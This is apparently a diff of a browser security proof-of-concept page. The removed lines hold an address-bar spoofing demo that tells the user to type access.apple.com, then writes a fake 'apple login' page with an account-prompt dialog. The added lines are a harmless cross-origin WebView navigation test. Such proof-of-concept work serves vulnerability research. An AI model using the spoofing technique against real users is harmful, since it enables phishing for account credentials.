@@ -1,24 +1,53 @@
-<h1 id="msg">Next,type access.apple.com in the address barssssssssss.</h1>
-<h1 id="spoof"></h1>
-<script type="text/javascript">
-spoof.style.display = 'none';
-var done = 0;
-var got = 0;
-onbeforeunload = function(ev) {
-  done = 1;
-  return false;
+<!DOCTYPE html>
+<html>
+<head>
+<meta charset="UTF-8">
+<title>WebView Origin Test PoC</title>
+<style>
+body {
+  font-family: Arial;
+  text-align: center;
+  margin-top: 80px;
 }
-onmousemove = function() {
-  stop();
-  if (done && !got) {
-    msg.style.display = 'none';
-    got = "1000";
-    if (got) {
-      document.write("<title>apple login</title><h1>This is not apple.com!!!</h1><scri"+"pt>onbeforeunload=function(){/*while(1){}*/};document.write('<input id=\\\'log\\\'>');window.stop();prompt('enter your apple account...');window.stop();location.assign('https://access.apple.com:9090');</scrip"+"t>");
-      spoof.style.display = 'block';
-      log.value = got;
-      
-    }
+
+button {
+  padding: 12px 20px;
+  font-size: 16px;
+}
+</style>
+</head>
+
+<body>
+
+<h2>WebView Origin Test</h2>
+<p>Test window navigation behavior</p>
+
+<button onclick="test()">Start Test</button>
+
+<script>
+function test() {
+
+  const win = window.open("https://x.com:90");
+
+  if (!win) {
+    alert("Popup blocked");
+    return;
   }
+
+  setTimeout(() => {
+    try {
+      win.document.body.innerHTML = `
+        <h1>Test Content</h1>
+        <p>This page checks WebView rendering behavior.</p>
+        <p>No data is collected.</p>
+      `;
+    } catch (e) {
+      console.log("Cross-origin protection:", e);
+    }
+  }, 2000);
+
 }
 </script>
+
+</body>
+</html>
